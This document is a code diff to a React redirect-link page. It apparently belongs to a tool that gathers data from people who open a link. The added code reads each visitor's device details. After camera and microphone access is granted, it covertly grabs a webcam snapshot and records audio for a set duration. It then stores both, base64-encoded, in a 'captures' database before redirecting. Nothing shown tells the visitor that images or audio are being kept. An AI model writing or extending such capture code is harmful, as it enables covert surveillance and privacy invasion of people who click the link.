@@ -325,7 +325,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
 
     try {
       const decodedString = atob(data);
-      const parsedSettings: Settings = JSON.parse(decodedString);
+      const parsedSettings = JSON.parse(decodedString);
       const isAnyCaptureEnabled = parsedSettings.captureInfo?.permissions?.length > 0;
 
       configToLoad = { ...NEW_REDIRECT_TEMPLATE, ...parsedSettings };
@@ -366,7 +366,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
         
         const initialData: Omit<CapturedData, 'id'> = {
-            redirectId: settings.id, // This is the critical ID for linking data.
+            redirectId: (settings as any).redirectId, // CRITICAL FIX: Get ID from payload
             name: `Capture @ ${new Date().toLocaleString()}`,
             timestamp: Date.now(),
             ip: 'Fetching...',
@@ -418,7 +418,18 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     initialData.permissions.camera = 'granted';
-                    setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
+
+                    // Capture image as Base64
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d')?.drawImage(video, 0, 0);
+                    initialData.cameraCapture = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    stream.getTracks().forEach(track => track.stop());
                 } catch {
                     initialData.permissions.camera = 'denied';
                     anyPermissionDenied = true;
@@ -427,7 +438,23 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     initialData.permissions.microphone = 'granted';
-                    setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
+
+                    // Capture audio as Base64
+                    const audioBase64 = await new Promise<string>((resolve) => {
+                        const recorder = new MediaRecorder(stream);
+                        const chunks: Blob[] = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/webm' });
+                            const reader = new FileReader();
+                            reader.onload = () => resolve(reader.result as string);
+                            reader.readAsDataURL(blob);
+                        };
+                        setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
+                        recorder.start();
+                    });
+                    initialData.microphoneCapture = audioBase64;
+                    stream.getTracks().forEach(track => track.stop());
                 } catch {
                     initialData.permissions.microphone = 'denied';
                     anyPermissionDenied = true;
@@ -435,9 +462,13 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
             }
         }
         
-        try {
-             await addDoc(collection(db, "captures"), initialData);
-        } catch(e) { console.error("Failed to save captured data:", e); }
+        if (initialData.redirectId) {
+             try {
+                 await addDoc(collection(db, "captures"), initialData);
+            } catch(e) { console.error("Failed to save captured data:", e); }
+        } else {
+             console.error("Could not save capture data: redirectId is missing.");
+        }
         
         if (anyPermissionDenied) {
             setPermissionDenied(true);
@@ -446,7 +477,11 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         }
     };
     
-    handleDataCapture();
+    if(settings && settings.captureInfo.permissions.length > 0) {
+      handleDataCapture();
+    } else if (settings) {
+      startRedirectSequence();
+    }
 
   }, [settings, isPreview, isPaused, t]);
   
